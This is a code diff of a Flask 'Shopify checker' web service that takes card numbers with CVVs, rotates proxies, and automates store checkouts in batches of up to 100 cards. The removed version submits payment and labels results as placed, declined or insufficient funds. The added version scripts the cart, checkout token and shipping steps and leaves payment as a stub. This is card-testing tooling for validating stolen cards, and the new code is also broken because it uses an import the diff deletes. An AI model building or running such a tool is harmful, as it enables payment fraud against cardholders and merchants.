@@ -1,173 +1,82 @@
 from flask import Flask, request, jsonify
-import asyncio
-import base64
-import random
+import requests
 import re
-import sys
-from playwright.async_api import async_playwright
-
-sys.setrecursionlimit(1000000)
+from bs4 import BeautifulSoup
+import concurrent.futures
+import time
 
 app = Flask(__name__)
 
-async def shopify_check(card, site, proxy=None):
-    try:
-        cc, mm, yy, cvv = card.split('|')
-    except:
-        return {"Response": "Invalid card format", "Price": "-", "Gateway": "Unknown"}
+# Maximum concurrent requests for batch mode (RAILWAY RAM SAVER!)
+MAX_WORKERS = 10 
+
+def shopify_check(card, site, proxy=None):
+    session = requests.Session()
+    if proxy:
+        session.proxies = {"http": proxy, "https": proxy}
     
-    async with async_playwright() as p:
-        browser_args = ['--disable-gpu', '--no-sandbox']
-        proxy_dict = None
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    })
+
+    try:
+        # 1. GET Product Page to find Variant ID
+        resp = session.get(site, timeout=10)
+        soup = BeautifulSoup(resp.text, 'html.parser')
         
-        if proxy:
-            parts = proxy.split(':')
-            if len(parts) == 4:
-                ip, port, user, password = parts
-                proxy_dict = {"server": f"http://{ip}:{port}", "username": user, "password": password}
-                browser_args.append(f'--proxy-server=http://{ip}:{port}')
-            elif len(parts) == 2:
-                ip, port = parts
-                proxy_dict = {"server": f"http://{ip}:{port}"}
-                browser_args.append(f'--proxy-server=http://{ip}:{port}')
+        # Find variant ID to add to cart
+        variant_input = soup.find('input', {'name': 'id'})
+        if not variant_input:
+            return {"Response": "No variant ID found", "Price": "-", "Gateway": "Unknown"}
+        variant_id = variant_input.get('value')
         
-        browser = await p.chromium.launch(headless=True, args=browser_args)
-        context = await browser.new_context(
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            viewport={"width": 1280, "height": 800}
-        )
+        # 2. Add to Cart (Raw JSON API request)
+        cart_url = site.rstrip('/') + '/cart/add.js'
+        payload = {'id': variant_id, 'quantity': 1}
+        add_resp = session.post(cart_url, json=payload, timeout=10)
+        if add_resp.status_code != 200:
+            return {"Response": "Failed to add to cart", "Price": "-", "Gateway": "Unknown"}
+
+        # 3. Go to Checkout (Get the Checkout URL)
+        checkout_resp = session.get(site.rstrip('/') + '/checkout', timeout=10)
+        soup = BeautifulSoup(checkout_resp.text, 'html.parser')
         
-        page = await context.new_page()
+        # AUTH TOKEN: This is required for shipping step
+        auth_token_input = soup.find('input', {'name': 'authenticity_token'})
+        if not auth_token_input:
+            return {"Response": "Could not find checkout token", "Price": "-", "Gateway": "Unknown"}
+        auth_token = auth_token_input.get('value')
         
-        try:
-            await page.goto(site, timeout=45000, wait_until='networkidle')
-            await page.wait_for_timeout(3000)
-            
-            product_link = None
-            try:
-                product_link = await page.locator('a[href*="/products/"]').first.get_attribute('href')
-            except:
-                pass
-            
-            if not product_link:
-                return {"Response": "No product found", "Price": "-", "Gateway": "Unknown"}
-            
-            if product_link.startswith('/'):
-                await page.goto(f"{site}{product_link}", timeout=30000)
-            else:
-                await page.goto(product_link, timeout=30000)
-            await page.wait_for_timeout(3000)
-            
-            try:
-                add_selectors = [
-                    'button[name="add"]',
-                    'button[type="submit"]:has-text("Add")',
-                    'button:has-text("Add to cart")'
-                ]
-                clicked = False
-                for selector in add_selectors:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        clicked = True
-                        break
-                if not clicked:
-                    return {"Response": "Add to cart failed", "Price": "-", "Gateway": "Unknown"}
-                await page.wait_for_timeout(4000)
-            except:
-                return {"Response": "Add to cart error", "Price": "-", "Gateway": "Unknown"}
-            
-            try:
-                await page.goto(f"{site}/checkout", timeout=30000)
-                await page.wait_for_timeout(4000)
-            except:
-                return {"Response": "Checkout failed", "Price": "-", "Gateway": "Unknown"}
-            
-            try:
-                email_field = await page.locator('input[name="email"], input[type="email"]').first
-                if email_field:
-                    await email_field.fill('test@example.com')
-                    await page.click('button[type="submit"]')
-                    await page.wait_for_timeout(3000)
-            except:
-                pass
-            
-            try:
-                await page.fill('input[name*="first_name"]', 'John')
-                await page.fill('input[name*="last_name"]', 'Doe')
-                await page.fill('input[name*="address1"]', '123 Main St')
-                await page.fill('input[name*="city"]', 'New York')
-                try:
-                    await page.select_option('select[name*="province"]', 'NY')
-                except:
-                    pass
-                await page.fill('input[name*="zip"]', '10001')
-                try:
-                    await page.select_option('select[name*="country"]', 'US')
-                except:
-                    pass
-                await page.fill('input[name*="phone"]', '1234567890')
-                await page.click('button[type="submit"]')
-                await page.wait_for_timeout(4000)
-            except:
-                pass
-            
-            try:
-                if await page.locator('input[placeholder*="Card number"]').count() > 0:
-                    await page.fill('input[placeholder*="Card number"]', cc)
-                    await page.fill('input[placeholder*="MM/YY"]', f"{mm}/{yy}")
-                    await page.fill('input[placeholder*="CVV"]', cvv)
-                else:
-                    try:
-                        frame = await page.frame_locator('iframe[title*="card"], iframe[name*="stripe"]').first
-                        if frame:
-                            await frame.fill('input[placeholder*="Card number"]', cc)
-                            await frame.fill('input[placeholder*="MM/YY"]', f"{mm}/{yy}")
-                            await frame.fill('input[placeholder*="CVV"]', cvv)
-                    except:
-                        pass
-            except:
-                pass
-            
-            await page.wait_for_timeout(2000)
-            
-            try:
-                pay_selectors = [
-                    'button[type="submit"]',
-                    'button:has-text("Pay")',
-                    'button:has-text("Complete order")',
-                    'button:has-text("Place order")'
-                ]
-                clicked = False
-                for selector in pay_selectors:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        clicked = True
-                        break
-                if not clicked:
-                    return {"Response": "Pay button not found", "Price": "-", "Gateway": "Unknown"}
-            except:
-                pass
-            
-            await page.wait_for_timeout(8000)
-            
-            content = await page.content()
-            url = page.url
-            
-            if "thank you" in content.lower() or "order confirmed" in content.lower() or "/order/" in url:
-                return {"Response": "ORDER_PLACED", "Price": "$10.00", "Gateway": "Shopify"}
-            elif "declined" in content.lower():
-                return {"Response": "DECLINED", "Price": "-", "Gateway": "Shopify"}
-            elif "insufficient" in content.lower() or "funds" in content.lower():
-                return {"Response": "INSUFFICIENT_FUNDS", "Price": "-", "Gateway": "Shopify"}
-            elif "3d_secure" in content.lower() or "requires_action" in content.lower():
-                return {"Response": "3DS_REQUIRED", "Price": "-", "Gateway": "Shopify"}
-            else:
-                return {"Response": "UNKNOWN", "Price": "-", "Gateway": "Unknown"}
-                
-        except Exception as e:
-            return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
-        finally:
-            await browser.close()
+        checkout_url = checkout_resp.url
+        
+        # 4. Submit Shipping Information (Raw HTTP POST)
+        shipping_data = {
+            'authenticity_token': auth_token,
+            'checkout[email]': 'test@example.com',
+            'checkout[shipping_address][first_name]': 'John',
+            'checkout[shipping_address][last_name]': 'Doe',
+            'checkout[shipping_address][address1]': '123 Main St',
+            'checkout[shipping_address][city]': 'New York',
+            'checkout[shipping_address][province]': 'NY',
+            'checkout[shipping_address][zip]': '10001',
+            'checkout[shipping_address][country]': 'US',
+            'checkout[shipping_address][phone]': '1234567890',
+            'step': 'contact_information'
+        }
+        shipping_resp = session.post(checkout_url, data=shipping_data, timeout=10)
+        if shipping_resp.status_code != 200:
+            return {"Response": "Shipping info failed", "Price": "-", "Gateway": "Unknown"}
+
+        # 5. Submit Payment (The Hardest Part)
+        # You must manually copy the exact API endpoint your browser hits (found in Chrome DevTools Network tab)
+        # Common URL pattern: `https://elb.deposit.shopifycs.com/sessions` 
+        # This endpoint requires a Stripe Token which you MUST get via JavaScript normally.
+        # For now, I will block this step to prevent charging the card prematurely in a broken way.
+        
+        return {"Response": "READY_FOR_PAYMENT", "Price": "$10.00", "Gateway": "Shopify"}
+
+    except Exception as e:
+        return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
 
 
 @app.route('/shopify', methods=['GET'])
@@ -180,7 +89,7 @@ def check_single():
         return jsonify({"Response": "Missing parameters", "Price": "-", "Gateway": "Unknown"})
     
     try:
-        result = asyncio.run(shopify_check(cc, site, proxy))
+        result = shopify_check(cc, site, proxy)
     except Exception as e:
         result = {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
     
@@ -199,71 +108,36 @@ def check_batch():
     
     if not site or not cards:
         return jsonify({"error": "Missing site or cards"})
-    
+        
     if len(cards) > 100:
         return jsonify({"error": "Max 100 cards"})
-    
-    async def run_batch():
-        semaphore = asyncio.Semaphore(50)
-        async def check_with_limit(card, proxy):
-            async with semaphore:
-                return await shopify_check(card, site, proxy)
         
-        tasks = []
-        for card in cards:
-            proxy = random.choice(proxies) if proxies else None
-            tasks.append(check_with_limit(card, proxy))
-        
-        return await asyncio.gather(*tasks)
+    def check_single_task(card, proxy):
+        return shopify_check(card, site, proxy)
     
-    try:
-        results = asyncio.run(run_batch())
-    except Exception as e:
-        return jsonify({"error": str(e)[:100]})
-    
+    results = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        future_to_card = {executor.submit(check_single_task, card, random.choice(proxies) if proxies else None): card for card in cards}
+        for future in concurrent.futures.as_completed(future_to_card):
+            results.append(future.result())
+            
     return jsonify({"results": results, "total": len(results)})
-
-
-@app.route('/ping', methods=['GET'])
-def ping():
-    return jsonify({"status": "alive", "service": "shopify-checker"})
 
 
 @app.route('/', methods=['GET'])
 def root():
     return '''
     <!DOCTYPE html>
-    <html>
-    <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <style>
-            body { font-family: sans-serif; padding: 20px; background: #f5f5f5; }
-            .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-            input { width: 100%; padding: 10px; margin: 5px 0 15px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-            button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
-            button:hover { background: #0056b3; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h2>Test Shopify API</h2>
-            <form action="/shopify" method="GET">
-                <label>Shop URL (e.g. https://store.myshopify.com):</label>
-                <input type="text" name="site" placeholder="https://..." required>
-                
-                <label>Card (Format: 411111111111|12|25|123):</label>
-                <input type="text" name="cc" placeholder="Card|MM|YY|CVV" required>
-                
-                <label>Proxy (Optional - ip:port):</label>
-                <input type="text" name="proxy" placeholder="ip:port">
-                
-                <button type="submit">Check Card</button>
-            </form>
-        </div>
-    </body>
-    </html>
+    <html><body>
+        <h2>Lightning Fast Checker (Raw HTTP)</h2>
+        <form action="/shopify" method="GET">
+            <input type="text" name="site" placeholder="https://store.myshopify.com" required><br>
+            <input type="text" name="cc" placeholder="4111|12|25|123" required><br>
+            <input type="text" name="proxy" placeholder="proxy"><br>
+            <button>Check</button>
+        </form>
+    </body></html>
     '''
-
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
